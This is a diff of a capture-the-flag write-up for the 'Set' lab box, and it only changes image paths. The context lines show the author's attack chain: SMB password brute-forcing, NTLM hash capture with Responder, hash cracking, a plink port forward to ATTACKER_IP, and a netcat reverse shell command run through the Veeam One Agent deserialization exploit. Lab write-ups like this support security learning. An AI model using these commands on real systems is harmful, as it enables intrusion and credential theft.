@@ -60,28 +60,28 @@ There are five ports open:
 
 I also see two domain names leaked from DNS, being set.windcorp.thm and seth.windcorp.thm so I add those to my /etc/hosts file. I'll begin enumerating SMB as it's quick and then head over to the web server.
 
-![](../assets/img/2026-01-23-Set/1.png)
+![](/assets/img/2026-01-23-Set/1.png)
 
 Guest authentication has been disabled so we'll definitely need credentials to access shares. The machine is most likely running a Windows 10 Server 2019 build or something similar to it.
 
 I fire up gobuster to leave subdirectory/subdomain scans in the background to save on time. This confirms the existence of only two subdomains.
 
-![](../assets/img/2026-01-23-Set/2.png)
+![](/assets/img/2026-01-23-Set/2.png)
 
 Checking out the landing page shows a static page for their organization that lacks a lot of functionality. There is a section for team members we can use to craft usernames.
 
-![](../assets/img/2026-01-23-Set/3.png)
+![](/assets/img/2026-01-23-Set/3.png)
 
 I spend a while scanning and enumerating directories to find absolutely nothing. The challenge info stated that the domain controller was secured properly and that this domain was used for developers, having issues in the past.
 
 A bit testing on the webpage showed that their contact section also had a name query bar that would return staff members' name, phone number, and email.
 
-![](../assets/img/2026-01-23-Set/4.png)
+![](/assets/img/2026-01-23-Set/4.png)
 
 ## Brute Forcing
 This also leaked their naming convention for usernames which is first name + three letters of their last name (ie. tammyjoh). Checking the network tab in my browser's developer tools showed that each search made a GET request to the users.xml page.
 
-![](../assets/img/2026-01-23-Set/5.png)
+![](/assets/img/2026-01-23-Set/5.png)
 
 I download it and extract the names from the list.
 
@@ -89,11 +89,11 @@ I download it and extract the names from the list.
 awk -F'[<>]' '/<name>/{print $3}' users.xml > usernames.txt
 ```
 
-![](../assets/img/2026-01-23-Set/6.png)
+![](/assets/img/2026-01-23-Set/6.png)
 
 Now that I know some files may be exposed on the server I run another gobuster directory bust and get an interesting hit. This file may be leftover from when they were recovering being hacked and forgot to delete it.
 
-![](../assets/img/2026-01-23-Set/7.png)
+![](/assets/img/2026-01-23-Set/7.png)
 
 I'll convert the list of names to the site's naming convention to grab valid usernames and then run each one along with a short/common password list on SMB to see about getting any logons.
 
@@ -101,17 +101,17 @@ I'll convert the list of names to the site's naming convention to grab valid use
 awk '{print $1 substr($2,1,3)}' usernames.txt >  validusers.txt
 ```
 
-![](../assets/img/2026-01-23-Set/8.png)
+![](/assets/img/2026-01-23-Set/8.png)
 
 For some reason hydra couldn't get a valid response from SMB on port 445, so I switch to Metasploit's smb_login module, which is pretty slow but works well.
 
 After a few wordlists and a lot of waiting, I find that SecList's top-20-common-SSH-passwords.txt list works to get a login as myrtleowe.
 
-![](../assets/img/2026-01-23-Set/9.png)
+![](/assets/img/2026-01-23-Set/9.png)
 
 Checking what Shares she has access to leads me to a file named Info.txt which holds our first flag.
 
-![](../assets/img/2026-01-23-Set/10.png)
+![](/assets/img/2026-01-23-Set/10.png)
 
 At this point I try psexec and evil-winrm for a quick win at getting a shell on the box but don't neither work. The info file from the share noted that all zip files uploaded there will be reviewed, so if we upload one there maybe we can pop one that way.
 
@@ -124,30 +124,30 @@ Some more research rewarded me with another quite interesting exploit. [CVE-2025
 
 Then, I zip the .lnk file, upload it the Files share, and set up my SMB listener using sudo Responder -I tun0 .
 
-![](../assets/img/2026-01-23-Set/11.png)
+![](/assets/img/2026-01-23-Set/11.png)
 
 After a short moment, I capture the NTLM hash for user MichelleWat.
 
-![](../assets/img/2026-01-23-Set/12.png)
+![](/assets/img/2026-01-23-Set/12.png)
 
 Next up, I send it to JohnTheRipper (or Hashcat if you prefer) to crack the hash using rockyou.txt.
 
-![](../assets/img/2026-01-23-Set/13.png)
+![](/assets/img/2026-01-23-Set/13.png)
 
 ## Privilege Escalation
 Turns out she has access to WinRM onto the system, which makes sense as she is the one checking the 'Files' share uploads. Here we can grab the second flag and start looking for routes to administrator privileges.
 
-![](../assets/img/2026-01-23-Set/14.png)
+![](/assets/img/2026-01-23-Set/14.png)
 
 This account doesn't have any special permissions to abuse so I look around the file system. I discover a test.txt file on the C:\ drive which displays the NT AUTHORITY\SYSTEM account name as well as a script directory. The only script inside was one to open the Files share we just exploited, so this was the automatic process that allowed for that. Well that's a dead end.
 
 I take a look at the services running and find something listening locally on port 2805.
 
-![](../assets/img/2026-01-23-Set/15.png)
+![](/assets/img/2026-01-23-Set/15.png)
 
 Google shows that the default for TCP 2805 is a service named 'Veeam One Agent' that is used for monitoring and analytics. Swapping directories to 'Program Files' confirms this and I grab the version to look for any potential CVEs.
 
-![](../assets/img/2026-01-23-Set/16.png)
+![](/assets/img/2026-01-23-Set/16.png)
 
 Research shows that this version was prone to [CVE-2020–10914](https://nvd.nist.gov/vuln/detail/cve-2020-10914)/[CVE-2020-10915](https://nvd.nist.gov/vuln/detail/cve-2020-10915), which allows us to execute arbitrary code on the system without authentication. This is due to how the .NET application handles serialized data and accepts input. The root cause is lack of user-supplied input sanitization, which goes to show we can't blindly trust information supplied by them.
 
@@ -159,7 +159,7 @@ I upload plink.exe (already installed on most Kali builds) to the machine using 
 echo y | & ./plink.exe -R 2805:127.0.0.1:2805 -l USERNAME -pw PASSWORD ATTACKER_IP
 ```
 
-![](../assets/img/2026-01-23-Set/17.png)
+![](/assets/img/2026-01-23-Set/17.png)
 
 _Note: We have to supply echo y into the command to accept the SSH key on our server._
 
@@ -183,15 +183,15 @@ This meant we'd have to update the module in Metasploit itself. You can either c
 
 First, we need to add another exploit target under the preexisting ones.
 
-![](../assets/img/2026-01-23-Set/18.png)
+![](/assets/img/2026-01-23-Set/18.png)
 
 Then, we update the register options to add a new option for CMD.
 
-![](../assets/img/2026-01-23-Set/19.png)
+![](/assets/img/2026-01-23-Set/19.png)
 
 And finally add a new case statement to execute our new option once used.
 
-![](../assets/img/2026-01-23-Set/20.png)
+![](/assets/img/2026-01-23-Set/20.png)
 
 [Link](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/misc/veeam_one_agent_deserialization.rb) to original Metasploit module.
 
@@ -436,11 +436,11 @@ This command uses cmd.exe to authenticate to our SMB server as user: test and pa
 set CMD 'cmd.exe /c net use a: \\ATTACKING_IP\share /user:test test ^& a:\nc.exe ATTACKING_IP PORT -e cmd.exe'
 ```
 
-![](../assets/img/2026-01-23-Set/21.png)
+![](/assets/img/2026-01-23-Set/21.png)
 
 We finally get a shell as a user named set with full administrator privileges on the system.
 
-![](../assets/img/2026-01-23-Set/22.png)
+![](/assets/img/2026-01-23-Set/22.png)
 
 We can grab the last flag under `C:\Users\Administrator\Desktop` to complete the box. This challenge was pretty awesome as it went from 0–100 real quick. I learned a ton while researching vulnerabilities pertaining to CVEs and SMB relay attacks.
 
